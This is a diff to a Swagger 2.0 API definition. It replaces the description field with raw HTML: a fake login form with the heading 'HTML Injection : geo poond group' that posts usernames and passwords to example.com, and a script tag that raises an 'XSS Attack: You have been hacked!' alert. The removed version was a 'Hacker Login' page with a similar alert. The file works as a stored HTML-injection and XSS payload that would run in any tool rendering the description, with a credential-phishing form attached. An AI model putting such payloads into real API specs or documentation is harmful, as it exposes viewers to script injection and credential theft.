@@ -1,78 +1,35 @@
 swagger: '2.0'
 info:
   version: 1.0.0
-  title: Hacker Theme Login Page
-  description: >
-    <style>
-      body {
-        background-color: black;
-        color: green;
-        font-family: "Courier New", Courier, monospace;
-      }
-      .login-form {
-        max-width: 300px;
-        margin: auto;
-        padding: 20px;
-        border: 1px solid green;
-        border-radius: 5px;
-        box-shadow: 0 0 10px green;
-      }
-      .form-container {
-        margin-top: 20px;
-      }
-      .form-group label {
-        color: green;
-      }
-      .form-group input {
-        background-color: black;
-        color: green;
-        border: 1px solid green;
-        width: 100%;
-        padding: 10px;
-        margin: 5px 0;
-      }
-      .btn {
-        background-color: green;
-        color: black;
-        border: 1px solid green;
-        padding: 10px;
-        width: 100%;
-        cursor: pointer;
-      }
-      .btn:hover {
-        background-color: darkgreen;
-      }
-    </style>
-    <div class="login-form">
-      <div class="heading">
-        <h1>Hacker Login</h1>
-      </div>
-      <div class="form-container">
-        <form id="loginForm" action="https://example.com/login" method="post" class="form-signin">
-          <div class="form-group">
-            <label for="username">Username</label>
-            <input type="text" name="username" size="20">
-          </div>
-          <div class="form-group">
-            <label for="password">Password</label>
-            <input type="password" name="password" size="20">
-          </div>
-          <div class="form-group">
-            <button type="submit" class="btn btn-default">Login</button>
-          </div>
+  title: Fake Login Page
+  description: '<div class="login-form">
+    <div class="heading">
+        <h1>HTML Injection : geo poond group</h1>
+    </div>
+    <div class="form-container">
+        <form action="https://example.com/login" method="post" class="form-signin">
+            <div class="form-group">
+                <label for="username">Username</label>
+                <input type="text" name="username" size="20">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" name="password" size="20">
+            </div>
+            <div class="form-group">
+                <button type="submit" class="btn btn-default">Login</button>
+            </div>
         </form>
-      </div>
     </div>
     <script>
-      document.getElementById('loginForm').addEventListener('submit', function(event) {
-        event.preventDefault();
-        alert('You are hacked!');
-      });
+      alert("XSS Attack: You have been hacked!");
     </script>
+</div>'
 paths:
   /:
     post:
       responses:
         '200':
           description: Login successful
+
 
